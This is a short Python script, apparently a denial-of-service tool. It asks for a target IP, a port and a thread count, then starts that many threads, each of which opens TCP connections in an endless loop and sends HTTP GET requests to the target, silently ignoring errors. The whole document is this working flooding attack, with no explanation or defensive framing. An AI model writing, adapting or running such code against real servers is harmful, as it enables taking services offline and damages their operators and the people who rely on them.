python
import socket
import threading

def attack(target_ip, target_port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.send(b"GET / HTTP/1.1\r\n\r\n")
        except:
            pass

if __name__ == "__main__":
    target_ip = input("Target IP: ")
    target_port = int(input("Target Port: "))
    num_threads = int(input("Number of Threads: "))

    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(target_ip, target_port))
        thread.start()


